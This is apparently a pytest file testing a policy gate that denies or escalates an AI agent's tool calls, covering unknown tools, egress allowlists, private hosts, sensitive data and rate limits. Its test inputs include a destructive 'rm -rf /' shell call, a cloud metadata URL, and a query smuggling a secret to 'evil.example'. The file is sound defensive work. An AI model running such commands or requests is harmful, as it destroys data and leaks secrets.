from __future__ import annotations

from typing import Any

import pytest

from personal_agent.netpolicy import domain_allowed, is_private_host, registrable_domain, urls_in
from personal_agent.schemas import ActionRequest
from personal_agent.sentinel import SentinelContext, judge, sanitize_capabilities
from personal_agent.tools.builtin import register_builtin_tools
from personal_agent.tools.registry import ToolRegistry

ALL_CAPS = ["web.read", "todo.write", "todo.read", "doc.write", "mail.draft", "mail.read", "mail.send"]


@pytest.fixture
def reg() -> ToolRegistry:
    r = ToolRegistry()
    register_builtin_tools(r)
    return r


def req(tool: str, **args: Any) -> ActionRequest:
    return ActionRequest(action_id="a1", goal_id="g1", step_id="s1", tool=tool, args=args)


def ctx(**kw: Any) -> SentinelContext:
    base: dict[str, Any] = {"allowed_capabilities": ALL_CAPS, "allowed_domains": ["wikipedia.org"]}
    base.update(kw)
    return SentinelContext(**base)


def test_unknown_tool_denied(reg: ToolRegistry) -> None:
    v = judge(req("shell.exec", cmd="rm -rf /"), reg, ctx())
    assert v.decision == "deny" and v.matched_rules == ["TOOL_UNKNOWN"]


def test_invalid_args_denied(reg: ToolRegistry) -> None:
    assert judge(req("web.fetch", url="ftp://x"), reg, ctx()).matched_rules == ["ARGS_INVALID"]


def test_capability_not_granted(reg: ToolRegistry) -> None:
    v = judge(req("mail.send", to=["a@b.com"], subject="s", body="b"), reg, ctx(allowed_capabilities=["web.read"]))
    assert v.decision == "deny" and "CAPABILITY_NOT_GRANTED" in v.matched_rules


@pytest.mark.parametrize("url,rule", [
    ("https://evil.example/x", "EGRESS_NOT_ALLOWLISTED"),
    ("http://127.0.0.1:8080/", "EGRESS_PRIVATE_HOST"),
    ("http://169.254.169.254/latest/meta-data", "EGRESS_PRIVATE_HOST"),
    ("http://router.local/", "EGRESS_PRIVATE_HOST"),
    ("https://wikipedia.org.evil.example/", "EGRESS_NOT_ALLOWLISTED"),
])
def test_egress_denied(reg: ToolRegistry, url: str, rule: str) -> None:
    v = judge(req("web.fetch", url=url), reg, ctx())
    assert v.decision == "deny" and rule in v.matched_rules


def test_egress_allowed_subdomain(reg: ToolRegistry) -> None:
    v = judge(req("web.fetch", url="https://zh.wikipedia.org/wiki/X"), reg, ctx())
    assert v.decision == "allow" and "EGRESS_OK" in v.matched_rules


def test_url_smuggled_in_search_query_checked(reg: ToolRegistry) -> None:
    v = judge(req("web.search", query="see https://evil.example/?d=secret"), reg, ctx())
    assert v.decision == "deny"


def test_sensitive_data_egress_needs_approval(reg: ToolRegistry) -> None:
    v = judge(req("web.search", query="花生过敏 餐厅"), reg, ctx(sensitive_values=["花生过敏"]))
    assert v.decision == "needs_approval" and "SENSITIVE_DATA_EGRESS" in v.matched_rules


def test_r3_needs_approval(reg: ToolRegistry) -> None:
    v = judge(req("mail.send", to=["a@b.com"], subject="s", body="b"), reg, ctx())
    assert v.decision == "needs_approval" and "RISK_R3_APPROVAL" in v.matched_rules


def test_r2_allowed(reg: ToolRegistry) -> None:
    assert judge(req("todo.add", text="买牛奶"), reg, ctx()).decision == "allow"


def test_rate_limit(reg: ToolRegistry) -> None:
    v = judge(req("todo.add", text="x"), reg, ctx(recent_calls_last_min={"todo.add": 30}))
    assert v.decision == "deny" and "RATE_LIMIT" in v.matched_rules


def test_sanitize_capabilities(reg: ToolRegistry) -> None:
    assert sanitize_capabilities(["web.read", "root.shell", "web.read"], reg) == ["web.read"]


def test_netpolicy_helpers() -> None:
    assert urls_in({"a": ["x https://a.com/b y", {"c": "http://d.org"}]}) == ["https://a.com/b", "http://d.org"]
    assert domain_allowed("en.wikipedia.org", ["wikipedia.org"])
    assert not domain_allowed("notwikipedia.org", ["wikipedia.org"])
    assert is_private_host("10.0.0.1") and is_private_host("localhost") and not is_private_host("8.8.8.8")
    assert registrable_domain("www.bbc.co.uk") == "bbc.co.uk"
    assert registrable_domain("news.example.com") == "example.com"
